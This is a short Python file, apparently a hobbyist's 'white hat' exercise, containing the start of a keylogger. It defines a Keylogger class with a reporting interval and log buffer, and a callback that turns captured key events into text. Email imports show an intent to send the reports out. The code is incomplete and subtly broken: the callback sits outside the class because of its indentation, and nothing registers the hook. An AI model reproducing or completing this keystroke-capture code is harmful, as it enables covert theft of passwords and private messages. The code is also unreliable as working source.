# First Attempt at White Hat Hacking/Cyberscurity Programming
# By Ben Alvaro 
# 03/05/2024

import keyboard #for logging
from threading import Timer
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

SEND_REPORT_EVER =  60

class Keylogger:
    def __init__(self, interval, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        
def callback(self, event):
    name = event.name
    if len(name) > 1:
        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        else:
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"
    self.log += name

